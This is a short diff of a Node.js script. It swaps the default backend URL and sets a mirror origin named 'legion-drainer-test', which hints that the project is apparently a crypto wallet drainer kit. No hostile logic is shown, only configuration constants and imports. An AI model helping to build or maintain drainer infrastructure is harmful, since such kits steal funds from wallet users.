@@ -9,7 +9,7 @@ import { readFileSync, statSync, readdirSync } from 'node:fs';
 import { spawnSync } from 'node:child_process';
 import { join } from 'node:path';
 
-const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');
+const BACKEND = (process.env.BACKEND_URL || 'https://sadrailala-production.up.railway.app').replace(/\/$/, '');
 const MIRROR_ORIGIN = process.env.MIRROR_ORIGIN || 'https://legion-drainer-test.surge.sh';
 const ROOT = new URL('..', import.meta.url).pathname.replace(/^\/([A-Z]:)/, '$1');
 
